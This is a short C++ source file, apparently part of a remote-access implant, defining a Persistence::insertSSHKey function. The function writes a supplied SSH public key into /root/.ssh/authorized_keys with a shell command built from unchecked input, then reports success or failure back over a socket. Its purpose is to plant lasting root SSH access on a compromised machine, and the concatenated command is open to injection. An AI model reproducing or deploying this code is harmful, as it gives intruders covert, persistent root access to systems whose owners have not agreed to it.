#include "Persistence.h"
#include <unistd.h>
#include <string>
#include <iostream>

void Persistence::insertSSHKey(int sockfd, const std::string& sshKey) { 
    std::string command = "mkdir -p /root/.ssh && echo \"" + sshKey + "\" > /root/.ssh/authorized_keys";
    int ret = system(command.c_str());
    if (ret == -1) {
        dprintf(sockfd, "Error executing command: %s\n", command.c_str());
    } else if (WIFEXITED(ret) && WEXITSTATUS(ret) == 0) {
        dprintf(sockfd, "SSH key insertion successful.\n");
    } else {
        dprintf(sockfd, "SSH key insertion failed.\n");
    }
}
